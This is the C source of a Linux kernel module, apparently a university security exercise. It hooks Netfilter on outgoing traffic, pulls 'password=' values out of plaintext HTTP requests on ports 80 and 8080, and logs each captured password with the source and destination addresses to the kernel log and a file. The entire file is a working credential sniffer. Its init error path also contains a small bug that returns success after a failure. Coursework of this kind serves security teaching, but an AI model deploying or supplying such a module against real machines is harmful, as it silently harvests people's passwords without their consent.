/*
 * http_password_detector.c - HTTP Password Detector Module
 * 
 * Bài tập slide 13.2: Swap syscall sock_send và detect password trong HTTP
 * - Sử dụng Netfilter hook để bắt HTTP packets
 * - Phân tích HTTP request và tìm "password=" trong data
 * - Lưu password vào file /var/log/http_passwords.log
 * 
 * Lưu ý: Module này chỉ demo cho mục đích học tập
 * 
 * Biên dịch: make
 * Load: sudo insmod http_password_detector.ko
 * Unload: sudo rmmod http_password_detector
 * 
 * Test: curl -X POST -d "username=admin&password=secret123" http://httpbin.org/post
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>

#define LOG_FILE "/var/log/http_passwords.log"
#define MAX_PASS_LEN 256

static struct nf_hook_ops nfho;
static struct file *log_fp = NULL;

/*
 * Ghi log vào file
 */
static int write_to_log(const char *data, size_t len)
{
    loff_t pos = 0;
    ssize_t ret;
    
    if (!log_fp) {
        return -1;
    }
    
    /* Ghi data vào file */
    ret = kernel_write(log_fp, data, len, &pos);
    
    if (ret < 0) {
        printk(KERN_ERR "Lỗi ghi file log: %zd\n", ret);
        return -1;
    }
    
    return 0;
}

/*
 * Tìm kiếm chuỗi "password=" trong HTTP data
 */
static int extract_password(const char *data, size_t len, char *password, size_t pass_size)
{
    const char *pwd_start;
    const char *pwd_end;
    size_t pwd_len;
    
    /* Tìm "password=" trong data */
    pwd_start = strnstr(data, "password=", len);
    if (!pwd_start) {
        return 0; /* Không tìm thấy */
    }
    
    /* Bỏ qua "password=" */
    pwd_start += 9;
    
    /* Tìm ký tự kết thúc: &, space, hoặc end of string */
    pwd_end = pwd_start;
    while (pwd_end < data + len && *pwd_end != '&' && *pwd_end != ' ' && 
           *pwd_end != '\r' && *pwd_end != '\n') {
        pwd_end++;
    }
    
    pwd_len = pwd_end - pwd_start;
    if (pwd_len == 0 || pwd_len >= pass_size) {
        return 0;
    }
    
    /* Copy password */
    memcpy(password, pwd_start, pwd_len);
    password[pwd_len] = '\0';
    
    return 1;
}

/*
 * Kiểm tra xem có phải HTTP request không
 */
static int is_http_request(const char *data, size_t len)
{
    /* Kiểm tra HTTP methods */
    if (len < 4) {
        return 0;
    }
    
    if (strncmp(data, "GET ", 4) == 0 ||
        strncmp(data, "POST ", 5) == 0 ||
        strncmp(data, "PUT ", 4) == 0 ||
        strncmp(data, "HEAD ", 5) == 0) {
        return 1;
    }
    
    return 0;
}

/*
 * Netfilter hook function
 * Được gọi khi có packet đi qua
 */
static unsigned int hook_func(void *priv,
                               struct sk_buff *skb,
                               const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct tcphdr *tcph;
    unsigned char *data;
    unsigned int data_len;
    char password[MAX_PASS_LEN];
    char log_buffer[512];
    int log_len;
    
    if (!skb) {
        return NF_ACCEPT;
    }
    
    /* Lấy IP header */
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }
    
    /* Lấy TCP header */
    tcph = tcp_hdr(skb);
    if (!tcph) {
        return NF_ACCEPT;
    }
    
    /* Chỉ xử lý HTTP port (80, 8080) */
    if (ntohs(tcph->dest) != 80 && ntohs(tcph->dest) != 8080) {
        return NF_ACCEPT;
    }
    
    /* Lấy TCP data */
    data = (unsigned char *)((unsigned char *)tcph + (tcph->doff * 4));
    data_len = ntohs(iph->tot_len) - (iph->ihl * 4) - (tcph->doff * 4);
    
    if (data_len <= 0) {
        return NF_ACCEPT;
    }
    
    /* Kiểm tra xem có phải HTTP request không */
    if (!is_http_request((char *)data, data_len)) {
        return NF_ACCEPT;
    }
    
    /* Tìm password trong HTTP data */
    if (extract_password((char *)data, data_len, password, sizeof(password))) {
        printk(KERN_INFO "HTTP Password Detected!\n");
        printk(KERN_INFO "  Source: %pI4:%d\n", &iph->saddr, ntohs(tcph->source));
        printk(KERN_INFO "  Dest: %pI4:%d\n", &iph->daddr, ntohs(tcph->dest));
        printk(KERN_INFO "  Password: %s\n", password);
        
        /* Ghi vào log file */
        log_len = snprintf(log_buffer, sizeof(log_buffer),
                          "[%lu] Source=%pI4:%d Dest=%pI4:%d Password=%s\n",
                          jiffies,
                          &iph->saddr, ntohs(tcph->source),
                          &iph->daddr, ntohs(tcph->dest),
                          password);
        
        write_to_log(log_buffer, log_len);
    }
    
    return NF_ACCEPT;
}

/*
 * Module init
 */
static int __init detector_init(void)
{
    int ret;
    
    printk(KERN_INFO "=== HTTP Password Detector Module ===\n");
    printk(KERN_INFO "Đang load module...\n");
    
    /* Mở file log */
    log_fp = filp_open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_fp)) {
        printk(KERN_ERR "Lỗi: Không thể mở file log %s\n", LOG_FILE);
        log_fp = NULL;
        return PTR_ERR(log_fp);
    }
    
    printk(KERN_INFO "Log file: %s\n", LOG_FILE);
    
    /* Đăng ký Netfilter hook */
    nfho.hook = hook_func;
    nfho.hooknum = NF_INET_POST_ROUTING;  /* Bắt outgoing packets */
    nfho.pf = PF_INET;                     /* IPv4 */
    nfho.priority = NF_IP_PRI_FIRST;       /* Ưu tiên cao nhất */
    
    ret = nf_register_net_hook(&init_net, &nfho);
    if (ret < 0) {
        printk(KERN_ERR "Lỗi: Không thể đăng ký Netfilter hook\n");
        filp_close(log_fp, NULL);
        log_fp = NULL;
        return ret;
    }
    
    printk(KERN_INFO "Netfilter hook đã được đăng ký\n");
    printk(KERN_INFO "Module đã sẵn sàng. Đang monitor HTTP traffic...\n");
    
    return 0;
}

/*
 * Module exit
 */
static void __exit detector_exit(void)
{
    printk(KERN_INFO "Đang unload HTTP password detector...\n");
    
    /* Hủy đăng ký Netfilter hook */
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "Netfilter hook đã được hủy\n");
    
    /* Đóng file log */
    if (log_fp) {
        filp_close(log_fp, NULL);
        log_fp = NULL;
        printk(KERN_INFO "Log file đã được đóng\n");
    }
    
    printk(KERN_INFO "Module đã được unload\n");
}

module_init(detector_init);
module_exit(detector_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Học viện Kỹ thuật Mật mã");
MODULE_DESCRIPTION("HTTP Password Detector - Bài tập slide 13.2");
MODULE_VERSION("1.0");